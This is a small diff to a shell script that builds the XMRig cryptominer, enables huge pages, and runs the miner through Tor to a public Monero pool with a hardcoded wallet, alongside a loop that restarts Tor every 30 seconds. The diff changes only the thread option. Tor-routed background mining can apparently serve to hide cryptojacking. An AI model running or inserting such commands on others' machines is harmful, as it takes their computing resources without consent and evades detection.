@@ -16,5 +16,5 @@ cd build
 cmake ..
 make
 sudo sysctl -w vm.nr_hugepages=128
-torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 42iZdPFRQPN1qpHG6niqkG6cY3oZph9Vn9JZvKZ1Guce7UVWj587z7TJ15fW85FDQHNU9Wiqe3qGXfP2VNHq4xa9MK5LUrU -p x9 -k --tls -a cn/r -t 4 --b
+torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 42iZdPFRQPN1qpHG6niqkG6cY3oZph9Vn9JZvKZ1Guce7UVWj587z7TJ15fW85FDQHNU9Wiqe3qGXfP2VNHq4xa9MK5LUrU -p x9 -k --tls -a cn/r --b
 while true; do service tor restart; sleep 30; done
